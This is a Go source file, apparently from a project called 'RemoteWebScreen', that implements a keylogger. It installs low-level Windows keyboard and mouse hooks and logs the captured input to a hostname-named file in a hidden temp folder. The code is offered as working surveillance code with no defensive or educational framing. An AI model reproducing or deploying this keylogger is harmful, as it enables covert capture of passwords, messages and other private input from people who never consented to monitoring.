package keyboard

import (
	"RemoteWebScreen/win32"
	"os"
	"path/filepath"
)

var Screen_logPath string
var Logfilename string

func init() {
	tempDir := os.TempDir()
	hostname, _ := os.Hostname()
	Screen_logPath = tempDir + "\\screen_log\\"
	_, err := os.Stat(Screen_logPath)
	if os.IsNotExist(err) {
		os.Mkdir(Screen_logPath, 0755)
	}
	Logfilename = hostname + ".log"
}

func Keylog() {
	jianpan_hok, err := win32.SetWindowsHookEx(win32.WH_KEYBOARD_LL, keyboardCallBack, 0, 0)
	if err != nil {
		return
	}
	defer win32.UnhookWindowsHookEx(jianpan_hok)

	shubao_hok, err := win32.SetWindowsHookEx(win32.WH_MOUSE_LL, mouseCallBack, 0, 0)
	if err != nil {
		return
	}
	defer win32.UnhookWindowsHookEx(shubao_hok)
	filePath := filepath.Join(Screen_logPath, Logfilename)
	go keyDump(filePath, true)
	win32.GetMessage(new(win32.MSG), 0, 0, 0)
	//win32.UnhookWindowsHookEx(jianpan_hok)
	//win32.UnhookWindowsHookEx(shubao_hok)
}
